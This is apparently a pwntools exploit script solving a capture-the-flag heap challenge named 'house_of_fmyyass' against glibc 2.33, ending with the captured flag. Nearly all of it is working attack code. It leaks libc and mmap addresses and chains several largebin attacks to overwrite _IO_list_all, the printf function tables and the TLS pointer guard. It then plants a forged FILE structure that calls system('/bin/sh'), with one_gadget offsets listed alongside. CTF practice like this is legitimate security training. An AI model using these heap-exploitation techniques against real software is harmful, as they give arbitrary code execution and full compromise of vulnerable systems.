from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('house_of_fmyyass')
# io = remote('129.211.173.64', 10003)
libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so')
elf = ELF('house_of_fmyyass')

'''
0xde78c execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xde78f execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xde792 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0xde975 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xde979 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL
'''


def ror(num, shift):
	for _ in range(shift):
		num = (num >> 0x1) + (num & 0x1) * 0xFFFFFFFFFFFFFFFF
	return num

def rol(num,shift):
	for _ in range(shift):
		num = (num << 0x1) & 0xFFFFFFFFFFFFFFFF + (num & 0x8000000000000000)
	return num


def add(size):
    io.sendlineafter('>> ', '1')
    io.sendlineafter('size: ', str(size))


def edit(offset, content):
    io.sendlineafter('>> ', '2')
    io.sendlineafter('size: ', str(len(content)))
    io.sendlineafter('offset: ', str(offset))
    io.sendafter('content: ', content)


def delete(idx):
    io.sendlineafter('>> ', '3')
    io.sendlineafter('idx: ', str(idx))


def show():
    io.sendlineafter('>> ', '4')


def pwn():
    add(0x18)
    edit(8, p64(0x431))
    edit(0x438, p64(0x21))
    edit(0x458, p64(0x421))
    edit(0x878, p64(0x21))
    edit(0x898, p64(0x21))
    delete(0x10)
    add(0x428)
    delete(0x10)
    edit(0x10, b'\x90')
    show()
    libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x100
    log.success('libc_base: ' + hex(libc_base))

    environ = libc_base + libc.sym['environ']
    log.success('environ: ' + hex(environ))
    exit = libc_base + libc.sym['exit']
    system = libc_base + libc.sym['system']
    _IO_cleanup = libc_base + 0x8ef80
    _IO_list_all = libc_base + libc.sym['_IO_list_all']
    tls = libc_base - 0x2890
    bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
    _IO_cookie_jumps = libc_base + 0x1e1a20
    top_chunk = libc_base + libc.sym['__malloc_hook'] + 0x70
    __printf_arginfo_table = libc_base + 0x1eb218
    __printf_function_table = libc_base + 0x1e35c8

    edit(0x10, b'\x00')
    delete(0x460)

    edit(0x10, b'a' * 8)
    show()
    io.recvuntil('a' * 8)
    mmap_base = u64(io.recvuntil('1. alloc\n', drop=True).ljust(8, b'\x00')) - 0x450
    log.success('mmap_base: ' + hex(mmap_base))
    edit(0x10, p64(top_chunk))
    add(0x418)
    # first largebin attack, rewrite mmap_base+0x450 into _IO_list_all
    edit(0x28, p64(_IO_list_all - 0x20))
    delete(0x460)
    add(0x1000)

    fake_IO_struct = b''
    fake_IO_struct += p64(0xfbad1800)
    fake_IO_struct += p64(0) * 0x4
    fake_IO_struct += p64(1)
    fake_IO_struct += p64(0) * 0x15
    fake_IO_struct += p64(_IO_cookie_jumps + 0x70 - 0x18)
    fake_IO_struct += p64(bin_sh)
    fake_IO_struct += p64(rol(system ^ (mmap_base + 0xDA0), 0x11))
    edit(0x450, fake_IO_struct)

    edit(0x898, p64(0x471))
    edit(0xd08, p64(0x21))
    edit(0xd28, p64(0x461))
    edit(0x1188, p64(0x21))
    edit(0x11a8, p64(0x21))
    # second largebin attack, rewrite mmap_base+0xd20 into __printf_arginfo_table
    delete(0x8a0)
    add(0x1000)
    edit(0x8b8, p64(__printf_arginfo_table - 0x20))
    delete(0xd30)
    add(0x1000)

    edit(0x898, p64(0x4b1))
    edit(0xd48, p64(0x21))
    edit(0xd68, p64(0x4a1))
    edit(0x1208, p64(0x21))
    edit(0x1228, p64(0x21))
    # second largebin attack, rewrite mmap_base+0xd60 into __printf_function_table
    delete(0x8a0)
    add(0x1000)
    edit(0x8b8, p64(__printf_function_table - 0x20))
    delete(0xd70)
    add(0x1000)
    # 0x7ffff7e472d6 <printf_positional+1270>    mov    rax, qword ptr [rax + rdi*8]
    # RAX  0x15ab02661d60 ◂— 0x0
    # RDI  0x73
    edit(0xd60 + 0x73 * 8, p64(_IO_cleanup))
    # 0x7ffff7e483f9 <printf_positional+5657>    call   rax                           <_IO_cleanup>
    # RAX  0x7ffff7e63f80 (_IO_cleanup) ◂— endbr64 

    edit(0x898, p64(0x4f1))
    edit(0xd88, p64(0x21))
    edit(0xda8, p64(0x4e1))
    edit(0x1288, p64(0x21))
    edit(0x12a8, p64(0x21))
    # third largebin attack, rewrite mmap_base+0xda0 into fs:[0x30]
    delete(0x8a0)
    add(0x1000)
    edit(0x8b8, p64(tls - 0x20))
    delete(0xdb0)
    add(0x1000)

    edit(0x898, p64(0x531))
    edit(0xdc8, p64(0x21))
    edit(0xde8, p64(0x521))
    edit(0x1308, p64(0x21))
    edit(0x1328, p64(0x21))
    # forth largebin attack, rewrite mmap_base+0xdf0 into top_chunk
    delete(0x8a0)
    add(0x1000)
    edit(0x8b8, p64(top_chunk - 0x20))
    delete(0xdf0)
    
    gdb.attach(io, 'b __malloc_assert')
    add(0x1000)
    pause()
    io.interactive()


'''
    f 0   0x7ffff7e492f0 __vfprintf_internal
    f 1   0x7ffff7e52d38 locked_vfxprintf+312
    f 2   0x7ffff7e52fc8 __fxprintf+248
    f 3   0x7ffff7e52fc8 __fxprintf+248
    f 4   0x7ffff7e671f2 __malloc_assert+66
    f 5   0x7ffff7e69914 sysmalloc+1860
    f 6   0x7ffff7e6a76f _int_malloc+3375
    f 7   0x7ffff7e6d8d5 calloc+133
'''

'''
    f 0   0x7ffff7e24a60 system
    f 1   0x7ffff7e63d4a _IO_flush_all_lockp+250
    f 2   0x7ffff7e63fa9 _IO_cleanup+41
    f 3   0x7ffff7e483fb printf_positional+5659
    f 4   0x7ffff7e4ad56 __vfprintf_internal+6758
    f 5   0x7ffff7e4bc20 buffered_vfprintf+192
    f 6   0x7ffff7e4a9c9 __vfprintf_internal+5849
    f 7   0x7ffff7e52d38 locked_vfxprintf+312
'''


if __name__ == '__main__':
    # pwn()
    while True:
        try:
            pwn()
        except:
            io.close()
            io = process('house_of_fmyyass')
            # io = remote('129.211.173.64', 10003)
            continue
        else:
            break


# flag{ae9dabea23e559cd5300f1a1686b7917}
